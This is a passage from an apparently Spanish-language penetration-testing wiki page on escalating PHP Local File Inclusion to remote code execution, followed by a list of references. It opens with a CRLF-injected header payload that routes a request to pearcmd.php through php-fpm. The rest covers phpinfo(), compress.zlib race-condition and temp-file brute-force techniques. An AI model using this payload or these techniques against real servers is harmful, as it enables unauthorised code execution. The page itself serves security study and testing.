Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### A través de phpinfo() (file_uploads = on)

Si encontraste un **Local File Inclusion** y un archivo que expone **phpinfo()** con file_uploads = on, puedes obtener RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### A través de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Si encontraste un **Local File Inclusion** y **puedes exfiltrate the path** del archivo temporal PERO el **server** está comprobando si el **archivo a incluir tiene marcas PHP**, puedes intentar **bypass that check** con esta **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### A través de eternal waiting + bruteforce

Si puedes abusar del LFI para **subir archivos temporales** y hacer que el server **cuelgue** la ejecución de PHP, podrías entonces **brute force nombres de archivo durante horas** para encontrar el archivo temporal:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Hacia un Fatal Error

Si incluyes cualquiera de los archivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Necesitas incluir el mismo 2 veces para provocar ese error).

**No sé cuán útil es esto, pero podría serlo.**\
_Incluso si causas un PHP Fatal Error, los archivos temporales de PHP subidos son eliminados._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
